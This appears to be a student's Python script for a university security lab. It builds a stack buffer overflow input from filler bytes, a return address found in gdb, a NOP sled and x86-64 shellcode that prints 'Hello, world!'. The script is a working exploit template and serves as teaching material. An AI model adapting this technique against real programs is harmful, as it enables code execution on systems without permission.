#!/usr/bin/env python
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016
# Dabin Lee + James Wiryo
# 1000727 

from struct import *

lennops = 80 # or some other value
# I found out the value 80 after trying a few times
lenfill = 72 # or some other value

# Hello World! payload - designed by Oka, 2014
payload = '\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'

# Set up return address. Pack is best to turn int to binary
# I found the address for inside gdb and outside gdb after running 
# a few times with telescope command and other command on gdb with
# a few trial and errors making breakpoints also helped in doing so
# You can enable on of inside gdb and outside gdb to run

# for inside gdb
# address = pack("<Q", 0x7fffffffde80)

# for outside gdb      
address = pack("<Q", 0x7fffffffde78) 

nops = "\x90" * lennops 

with open('payload','w') as f:
    f.write('A' * lenfill + address + nops + payload)
